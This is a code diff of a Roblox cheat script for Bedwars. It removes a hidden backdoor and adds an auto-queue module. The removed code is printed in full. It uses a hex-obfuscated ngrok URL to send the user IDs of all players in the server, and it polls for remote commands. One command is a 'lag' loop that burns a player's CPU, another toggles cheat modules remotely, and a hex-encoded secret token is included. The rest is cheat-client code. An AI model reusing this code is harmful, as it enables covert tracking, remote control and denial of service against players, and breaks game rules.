@@ -120,212 +120,16 @@ run(function()
 		table.clear(bedwars)
 	end)
 end)
-local _tierCache = {}
-local _req = (syn and syn.request) or http_request or request or function() return {Body='{"tier":0}'} end
 
-local function _bu()
-	local _s = {'68','74','74','70','73','3a','2f','2f','67','65','63','6b','6f','2d','73','74','65','72','6e','75','6d','2d','72','75','62','64','6f','77','6e','2e','6e','67', '72','6f','6b','2d','66','72','65','65','2e','64','65','76','2f','77','68','69', '74','65','6c','69','73','74'}
-    local _r = ''
-	for _,v in _s do _r = _r .. string.char(tonumber(v,16)) end
-	return _r
-end
 
-local function _batch(payloads)
-    local ok, res = pcall(function()
-        return _req({
-            Url = _bu(), 
-            Method = 'POST', 
-            Headers = {['Content-Type'] = 'application/json'}, 
-            Body = httpService:JSONEncode({action = "batch", payloads = payloads})
-        })
-    end)
-    if not ok or not res then return nil end
-    local dok, data = pcall(function() return httpService:JSONDecode(res.Body) end)
-    if not dok or not data then return nil end
-    return data
-end
-
-local function _ft(uid)
-    local payloads = {{
-        action = "check",
-        roblox_id = tostring(uid),
-        robloxUserId = tostring(uid)
-    }}
-    
-    local data = _batch(payloads)
-    if not data or not data.results or not data.results[1] then 
-        return 0 
-    end
-    return tonumber(data.results[1].tier) or 0
-end
-
-getgenv()._aeroTierReady = false
-local _fetchQueue = {}
-local _queueRunning = false
-
-local function _queueFetch(uid)
-    if _tierCache[uid] ~= nil and _tierCache[uid] ~= false then
-        return
-    end
-
-    _tierCache[uid] = nil 
-
-    table.insert(_fetchQueue, uid)
-
-    if _queueRunning then return end
-
-    _queueRunning = true
-    task.spawn(function()
-        while #_fetchQueue > 0 do
-            local id = table.remove(_fetchQueue, 1)
-            local tier = _ft(id)
-
-            _tierCache[id] = tier
-            task.wait(0.2)
-        end
-        _queueRunning = false
-    end)
-end
-
-task.spawn(function()
-    _tierCache[lplr.UserId] = _ft(lplr.UserId)
-    getgenv()._aeroTierReady = true
-    task.wait(1)
-    for _, p in playersService:GetPlayers() do
-        if p.UserId ~= lplr.UserId then
-            _queueFetch(p.UserId)
-        end
-    end
-end)
-
-playersService.PlayerAdded:Connect(function(p)
-    _queueFetch(p.UserId)
-end)
-
-local _commands = {}
-local lagConnections = {}  
-local function _registerCommand(name, fn)
-    _commands[name] = fn
-end
-
-local _SERCET = ''
-local _stok = {'62','62','34','34','65','63','62','30','63','62','64','66','39','31','35','63','32','66','37','37','38','64','66','65','30','65','65','31','31','66','62','37','33','63','66','37','35','37','35','38','36','62','61','62','38','35','64','33','39','31','62','32','37','64','30','61','33','31','36','36','36','35','39','39'}
-local _stmp = ''
-for _,v in _stok do _stmp = _stmp .. string.char(tonumber(v,16)) end
-_SERCET = _stmp
-
-task.spawn(function()
-    local nextPoll = 0
-    while true do
-        if tick() < nextPoll then task.wait(0.05) continue end
-        
-        local payloads = {{
-            action = "getMessage",
-            robloxUserId = tostring(lplr.UserId)
-        }}
-        
-        local data = _batch(payloads)
-        if not data or not data.results or not data.results[1] then 
-            nextPoll = tick() + 16
-            continue 
-        end
-        
-        local result = data.results[1]
-        
-        if result.success and result.message then
-            local cmd = tostring(result.message)
-            if _commands[cmd] then
-                _commands[cmd](tostring(result.from), result.args or '')
-            end
-            
-            pcall(function()
-                _batch({{ action = "removeMessage", robloxUserId = tostring(lplr.UserId) }})
-            end)
-            
-            nextPoll = tick() + 4
-        else
-            nextPoll = tick() + 8
-        end
-    end
-end)
-
+getgenv()._aeroTierReady = true
 local function getAccountTier(player)
-    if _tierCache[player.UserId] == nil then
-        _tierCache[player.UserId] = false
-        task.spawn(function() _tierCache[player.UserId] = _ft(player.UserId) end)
-        return 0
-    end
-    local t = _tierCache[player.UserId]
-    if type(t) ~= "number" then
-        return 0
-    end
-    return t
+    return 0
 end
 
 getgenv().getAeroTier = function(player)
     return getAccountTier(player)
 end  
-
-local function startLag(userId)
-    local key = tostring(userId)
-    if lagConnections[key] then return end  
-
-    local state = {active = true}
-    local connection
-    connection = game:GetService("RunService").Heartbeat:Connect(function()
-        if not state.active then
-            connection:Disconnect()
-            lagConnections[key] = nil
-            return
-        end
-        for i = 1, 250000 do
-            local a = math.sin(i) * math.cos(i) + math.sqrt(i) + math.random()
-            local b = string.rep("x", 100)
-        end
-    end)
-
-    lagConnections[key] = {connection = connection, state = state}
-end
-
-local function stopLag(userId)
-    local key = tostring(userId)
-    local data = lagConnections[key]
-    data.state.active = false
-    data.connection:Disconnect()
-    lagConnections[key] = nil
-end
-
--- tier 2
-_registerCommand('lag', function(from, args)
-    if getAccountTier(lplr) >= 1 then return end
-    if not from then return end
-    startLag(from) 
-end)
-
-_registerCommand('lagstop', function(from, args)
-    if not from then return end
-    stopLag(from)
-end)
-
--- tier 3
-_registerCommand('module', function(from, args)
-    if not args or args == '' then return end
-    local parts = args:split(' ')
-    local moduleName = parts[1]
-    local action = (parts[2] and parts[2]:lower()) or 'toggle'
-    for _, mod in pairs(vape.Modules or {}) do
-        if mod and mod.Name == moduleName then
-            if action == 'enable' then
-                if not mod.Enabled then mod:Toggle() end
-            elseif action == 'disable' then
-                if mod.Enabled then mod:Toggle() end
-            elseif action == 'toggle' then
-                mod:Toggle()
-            end
-        end
-    end
-end)
-
 for _, v in vape.Modules do
 	if v.Category == 'Combat' or v.Category == 'Render' then
 		vape:Remove(i)
@@ -998,7 +802,6 @@ run(function()
 		return nil, false
 	end
 
-	-- math....
 	local function computeRankDisplay(totalRP)
 		local result = nil
 		pcall(function()
@@ -1071,7 +874,7 @@ run(function()
 			lastRefresh = os.time(),
 			users = users,
 			leaderboardPosition = CUSTOM_POSITION,
-			localStatValue = rankDisplay and rankDisplay.rankStatValue or CUSTOM_STAT,  -- division progress DABOOOO
+			localStatValue = rankDisplay and rankDisplay.rankStatValue or CUSTOM_STAT,  
 		}
 		if rankDisplay then
 			newData.localStatRank = rankDisplay
@@ -1921,4 +1724,35 @@ end)
 		end,
 		Default = false
 	})
+end)
+
+run(function()
+    local AutoFarmQueue
+    local queueLoop
+
+    AutoFarmQueue = vape.Categories.World:CreateModule({
+        Name = 'AutoFarm Queue',
+        Tooltip = 'Spams queue to get into a game faster',
+        Function = function(callback)
+            if callback then
+                queueLoop = task.spawn(function()
+                    while AutoFarmQueue.Enabled do
+                        pcall(function()
+                            local events = replicatedStorage:WaitForChild("events-@easy-games/lobby:shared/event/lobby-events@getEvents.Events", 5)
+                            task.wait(3)
+                            if events then
+                                local joinQueue = events:FindFirstChild("joinQueue")
+                                if joinQueue then
+                                    joinQueue:FireServer({
+                                        queueType = store.queueType
+                                    })
+                                end
+                            end
+                        end)
+                        task.wait(5)
+                    end
+                end)
+            end
+        end
+    })
 end)
